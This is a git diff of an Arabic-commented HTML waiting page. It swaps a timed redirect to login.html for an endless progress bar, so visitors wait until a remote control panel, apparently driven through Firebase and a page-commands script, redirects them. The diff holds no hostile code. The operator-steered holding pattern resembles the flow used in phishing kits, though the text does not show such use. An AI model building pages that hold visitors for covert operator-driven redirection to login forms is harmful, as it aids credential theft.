@@ -255,45 +255,31 @@
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-    <script src="/assets/js/firebase-client.js?v=11"></script>
-    <script src="/assets/js/page-commands.js?v=3"></script>
+    <script src="/assets/js/firebase-client.js?v=12"></script>
+    <script src="/assets/js/page-commands.js?v=5"></script>
 
-    <!-- التحويل الاحتياطي بعد 3 ثوانٍ -->
+    <!-- انتظار دائم: تبقى الصفحة حتى تصل إشارة التوجيه من لوحة التحكم -->
     <script>
         (() => {
-            const durationMs = 4000;
-            const countdownElement = document.getElementById('countdownValue');
             const progressElement = document.getElementById('progressBar');
-            const startedAt = Date.now();
 
-            const countdownTimer = window.setInterval(() => {
-                const elapsedMs = Date.now() - startedAt;
-                const remainingMs = Math.max(0, durationMs - elapsedMs);
-                const remainingSeconds = Math.ceil(remainingMs / 1000);
-
-                countdownElement.textContent = String(remainingSeconds);
-                progressElement.style.width =
-                    `${Math.min(100, (elapsedMs / durationMs) * 100)}%`;
-
-                if (remainingMs <= 0) {
-                    window.clearInterval(countdownTimer);
-
-                    // إذا وجّهت لوحة التحكم العميل قبل انتهاء المهلة،
-                    // سينتقل المتصفح إلى الصفحة المطلوبة قبل تنفيذ هذا التحويل.
-                    window.location.replace('login.html');
-                }
+            // شريط تقدم بصري متكرر (لا يوجّه الصفحة تلقائياً) — يبقى العميل
+            // في الانتظار إلى أن تستقبل صفحة التوجيه إشارة من لوحة التحكم.
+            let percent = 0;
+            const tickTimer = window.setInterval(() => {
+                percent = (percent + 3) % 103;
+                progressElement.style.width = `${Math.min(100, percent)}%`;
             }, 100);
 
-            // إيقاف المؤقت عند مغادرة الصفحة بسبب توجيه لوحة التحكم.
             window.addEventListener('pagehide', () => {
-                window.clearInterval(countdownTimer);
+                window.clearInterval(tickTimer);
             }, { once: true });
         })();
     </script>
     <!-- i18n: القواميس + المحرّك + زر تبديل اللغة (يُطبَّق على كل الصفحات) -->
-    <script src="/assets/i18n/ar.js?v=1"></script>
-    <script src="/assets/i18n/en.js?v=1"></script>
-    <script src="/assets/i18n/ckb.js?v=1"></script>
+    <script src="/assets/i18n/ar.js?v=2"></script>
+    <script src="/assets/i18n/en.js?v=2"></script>
+    <script src="/assets/i18n/ckb.js?v=2"></script>
     <script src="/assets/i18n/i18n.js?v=1"></script>
     <script src="/assets/js/lang-switcher.js?v=1"></script>
 </body>
